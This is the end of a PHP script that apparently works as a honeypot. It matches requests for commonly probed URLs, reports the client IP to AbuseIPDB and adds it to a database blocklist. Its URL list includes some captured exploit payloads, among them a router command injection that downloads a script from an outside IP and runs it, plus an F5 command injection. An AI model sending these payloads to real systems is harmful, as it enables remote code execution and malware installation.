        "/afterlogic/VERSION" => "GET /afterlogic/VERSION",
        "/joomla/" => "Searching for Joomla",
        "/shell.php" => "Probing, /shell.php",
        "/desktop.ini.php" => "Probing, /desktop.ini.php",
        "/_fragment" => "GET /_fragment (Symphony Remote Code Execution)",
        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" => "Probing for wordpress vulns",
        "/HNAP1/" => "Searching for router login page",
        "/portal/redlion" => "Probing",
        "/cgi-bin/login.cgi?requestname=2&cmd=0" => "Attempting to hack login page",
        "/ui/login.php" => "Attempting to access login pages",
        "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media" => "Searching for fckeditor upload page",
        "/vendor/phpunit/phpunit/build.xml" => "Searching for PHPUnit",
        "/js/header-rollup-554.js" => "Probing for javascript",
        "/images/editor/separator.gif" => "Probing for editor",
        "/admin/includes/general.js" => "Trying to detect admin page",
        "/admin/view/javascript/common.js" => "Trying to detect admin page",
        "/misc/ajax.js" => "GET /misc/ajax.js",
        "/administrator/help/en-GB/toc.json" => "Probing for admin page",
        "/wp-content/plugins/apikey/f0x.php" => "Probing for wordpress API keys",
        "/wp-content/plugins/apikey/apikey.php" => "Probing for wordpress API keys",
        "/sql/index.php" => "Probing for sql admin pages.",
        "/MySQLAdmin/index.php" => "Probing for sql admin pages.",
        "/shopdb/index.php" => "Probing for sql admin pages.",
        "/phpiMyAdmin/index.php" => "Probing for sql admin pages.",
        "/phpiMyAdmin/index.php" => "Probing for sql admin pages.",
        "/phpMyAdmina/index.php" => "Probing for sql admin pages.",
        "/vendor/phpunit/phpunit/LICENSE" => "Searching for PHPUnit",
        "/xmlrpc.php" => "/xmlrpc.php",
        "/php.ini" => "Searching for PHP",
        "/ErKNDtwEzynKq/index.php" => "Probing for PHP based exploits",
        "/duck.php" => "Probing for PHP based exploits",
        "/sysadmin.php" => "Probing for PHP based exploits",
        "/secret.php" => "Probing: /secret.php",
        "/.config" => "Searching for config files",
        "/.local" => "Searching for config files",
        "/console/" => "Searching for webshells",
        "/currentsetting.htm" => "Netgear config page",
        "/status?full&json" => "Searching for server status pages",
        "/server-status?format=plain" => "Searching for server status pages",
        "/admin/api.php?version" => "Searching for admin pages",
        "/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22" => "Remote code execution",
        "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media" => "Attempt to upload assets",
        "/admin/view/javascript/common.js" => "Searching for admin pages",
        "/boaform/admin/formPing" => "Wifi Router exploit (likley botnet)",
        "/web_shell_cmd.gch" => "Searching for webshells",
        "/.well-known/security.txt" => "/.well-known/security.txt",
        "/new/" => "Wordpress hacks",
        "/blog/" => "Wordpress hacks",
        "/2019/" => "Wordpress hacks",
        "/2020/" => "Wordpress hacks",
        "/wp-json" => "Searching for wordpress exploits",
        "/wp-config.php.save" => "Wordpress exploits",
        "/level/15/exec/-/sh/run/CR" => "/level/15/exec/-/sh/run/CR",
        "/NonExistence" => "/NonExistence",
        "/.git/HEAD" => "Attempting to access git folder",
        "/y000000000000.cfg" => "Searching for config files",
        "/index.php/module/action/param1/${@die(sha1(xyzt))}" => "Remote code injection",
        "/volume1/web/webapi/query.cgi" => "/volume1/web/webapi/query.cgi",
        "//mysql/scripts/setup.php" => "Searching for phpMyAdmin",
        "//sql/sql/scripts/setup.php" => "Searching for phpMyAdmin",
        "/index.htm" => "GET /index.htm",
        "/wp2/wp-includes/wlwmanifest.xml" => "Wordpress scan",
        "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash" => "Command Injections",
        "/wp-content/plugins/angwp/package.json" => "Wordpress scan",
        "/owa/auth/logon.aspx" => "Searching for outlook admin page",
        "/autodiscover/autodiscover.xml" => "GET /autodiscover/autodiscover.xml",
        "/wp-config.good" => "Wordpress exploits",
        "/js/mage/cookies.js" => "/js/mage/cookies.js"
    );
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $url = $_SERVER["REQUEST_URI"];
        
        $ua = $_SERVER['HTTP_USER_AGENT'];
        echo "Before issets <br>";
        $hacks = $exploits;
        if(isset($hacks[$url])){
            $mes = "AUTOMATED REPORT: " . $hacks[$url];
        }
            echo "Before report <br>";
        if(isset($mes)){
            $ip = $_SERVER['REMOTE_ADDR'];
            $to_discord = "${ip} - ${mes}";
            $client = new GuzzleHttp\Client([
                'base_uri' => 'https://api.abuseipdb.com/api/v2/'
              ]);
              echo "Before POST <br>";
              $response = $client->request('POST', 'report', [
                  'query' => [
                      'ip' => "${ip}",
                      'categories' => '15',
                      'comment' => "${mes}"
                  ],
                  'headers' => [
                      'Accept' => 'application/json',
                      'Key' => $_ENV["ABUSE_IP_DB"]
                ],
              ]);
              echo "After send <br>";
              $output = $response->getBody();
              // Store response as a PHP object.
              $ipDetails = json_decode($output, true);
              echo "after full report <br>";
              $servername = $_ENV['MYSQL_SERVER'];
              $username = $_ENV["MYSQL_USERNAME"];
              $password = $_ENV["MYSQL_PASSWORD"];
              $dbname = $_ENV["MYSQL_DATABASE"];
    
              $conn = new mysqli($servername, $username, $password, $dbname);
              echo "Before db <br>";
              if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
              }
              $sql = "INSERT INTO `blocklist`(`ip`, `reason`) VALUES ('${ip}', 'Hacking attempt (HTTP)')";
              $result = $conn->query($sql);
              echo "After DB <br>";
              
            }
    
    
});



$router->run();
